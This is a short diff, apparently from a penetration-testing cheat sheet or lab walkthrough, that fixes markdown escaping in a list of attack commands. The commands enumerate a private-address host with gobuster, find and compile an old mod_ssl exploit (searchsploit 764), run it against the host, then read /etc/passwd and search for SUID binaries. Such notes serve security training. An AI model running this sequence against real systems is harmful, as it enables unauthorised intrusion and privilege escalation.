@@ -272,25 +272,25 @@ gobuster -u 192.168.20.139 -w /usr/share/wordlists/dirb/common.txt
 
 gobuster -k -u https://192.168.20.139 -w /usr/share/wordlists/dirb/common.txt
 
-searchsploit mod\_ssl 2.8.7
+searchsploit mod_ssl 2.8.7
 
 searchsploit -p 764
 
 gcc 764.c -o exploit -lcrypto
 
-./exploit | grep &quot;RedHat&quot; | grep &quot;1.3.20&quot;
+./exploit | grep "RedHat" | grep "1.3.20"
 
 ./exploit 0x6b 192.168.20.139 80
 
 uname -a
 
-cat /etc/\*-release
+cat /etc/*-release
 
 cat /etc/passwd | grep bash
 
-PATH=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games&quot;
+PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"
 
-find / -perm -u=s -type f 2\&gt;/dev/null
+find / -perm -u=s -type f 2>/dev/null
 
 gcc
 
